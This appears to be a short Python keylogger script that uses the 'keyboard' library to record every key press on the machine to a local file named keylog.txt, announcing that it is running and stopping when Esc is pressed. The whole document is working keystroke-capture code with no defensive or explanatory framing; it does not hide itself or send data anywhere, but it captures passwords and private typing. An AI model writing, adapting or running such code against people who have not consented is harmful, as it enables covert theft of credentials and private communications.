import keyboard

log_file = "keylog.txt"

def log_keystrokes(event):
    with open(log_file, "a") as f:
        f.write(event.name + " ")

# Start listening for key events
keyboard.on_press(log_keystrokes)

print("Keylogger running... Press 'Esc' to stop.")

keyboard.wait("esc")  # Stops when 'Esc' is pressed
